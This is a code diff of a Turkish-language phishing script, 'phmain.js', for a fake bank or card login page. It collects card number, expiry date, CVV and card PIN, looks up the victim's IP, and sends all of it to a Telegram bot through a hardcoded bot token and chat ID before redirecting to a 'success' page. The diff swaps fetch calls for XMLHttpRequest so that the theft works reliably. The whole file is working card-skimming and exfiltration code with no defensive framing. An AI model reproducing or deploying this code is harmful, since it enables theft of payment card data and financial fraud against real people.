@@ -1,10 +1,9 @@
-// phmain.js - KESİN ÇALIŞIR
+// phmain.js - XMLHttpRequest ile KESİN ÇALIŞAN
 
 const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
 const CHAT_ID = "-1002475411082";
 
-// Slider fonksiyonları
-window.slider1 = { prev: function() { console.log('prev'); } };
+window.slider1 = { prev: function() {} };
 window.closeAlert = function() { 
     document.getElementById('alertDiv').style.display = 'none';
 };
@@ -15,7 +14,7 @@ window.uyariKapat = function() {
 // Sayfa yüklendiğinde
 document.addEventListener('DOMContentLoaded', function() {
     
-    // Kart numarası - her 4 rakamda boşluk
+    // Kart numarası formatlama
     var kartInput = document.getElementById('customUsername');
     kartInput.addEventListener('input', function() {
         var deger = this.value.replace(/\s/g, '').replace(/\D/g, '');
@@ -27,7 +26,7 @@ document.addEventListener('DOMContentLoaded', function() {
         this.value = formatli;
     });
     
-    // SKT - otomatik slash
+    // SKT formatlama
     var expInput = document.getElementById('exp');
     expInput.addEventListener('input', function() {
         var deger = this.value.replace(/\D/g, '');
@@ -38,13 +37,13 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    // CVV - sadece rakam
+    // CVV
     var cvvInput = document.getElementById('cvv');
     cvvInput.addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '').slice(0, 3);
     });
     
-    // Şifre - sadece rakam
+    // Şifre
     var sifreInput = document.getElementById('kkpw');
     sifreInput.addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '').slice(0, 4);
@@ -52,7 +51,7 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Buton
     var btn = document.getElementById('btn-spc');
-    btn.addEventListener('click', function(e) {
+    btn.onclick = function(e) {
         e.preventDefault();
         
         var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
@@ -60,7 +59,7 @@ document.addEventListener('DOMContentLoaded', function() {
         var cvv = document.getElementById('cvv').value;
         var sifre = document.getElementById('kkpw').value;
         
-        // Basit doğrulamalar
+        // Doğrulama
         if (kartNo.length !== 16) {
             document.getElementById('alertDiv').style.display = 'block';
             return;
@@ -78,36 +77,38 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        // Kırmızı kaplamayı gizle
         document.getElementById('alertDiv').style.display = 'none';
-        
-        // Buton yazısını değiştir
         btn.innerHTML = 'Giriş yapılıyor...';
         btn.disabled = true;
         
-        // IP al ve Telegram'a gönder
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                var ip = data.ip;
-                var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
-                
-                // Telegram'a gönder
-                var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(mesaj);
-                return fetch(url);
-            })
-            .then(function(response) {
-                console.log('Telegram durum:', response.status);
-                // Başarılı olsun olmasın yönlendir
-                setTimeout(function() {
-                    window.location.href = 'success.html';
-                }, 1000);
-            })
-            .catch(function(err) {
-                console.log('Hata:', err);
-                setTimeout(function() {
-                    window.location.href = 'success.html';
-                }, 1000);
-            });
-    });
+        // IP al
+        var xhrIp = new XMLHttpRequest();
+        xhrIp.open('GET', 'https://api.ipify.org?format=json', true);
+        xhrIp.onload = function() {
+            var ip = 'Bilinmiyor';
+            if (xhrIp.status === 200) {
+                var data = JSON.parse(xhrIp.responseText);
+                ip = data.ip;
+            }
+            
+            var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
+            
+            // Telegram'a gönder
+            var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(mesaj);
+            var xhrTel = new XMLHttpRequest();
+            xhrTel.open('GET', url, true);
+            xhrTel.onload = function() {
+                console.log('Telegram cevap:', xhrTel.status, xhrTel.responseText);
+            };
+            xhrTel.onerror = function() {
+                console.log('Telegram hatası');
+            };
+            xhrTel.send();
+            
+            setTimeout(function() {
+                window.location.href = 'success.html';
+            }, 1000);
+        };
+        xhrIp.send();
+    };
 });
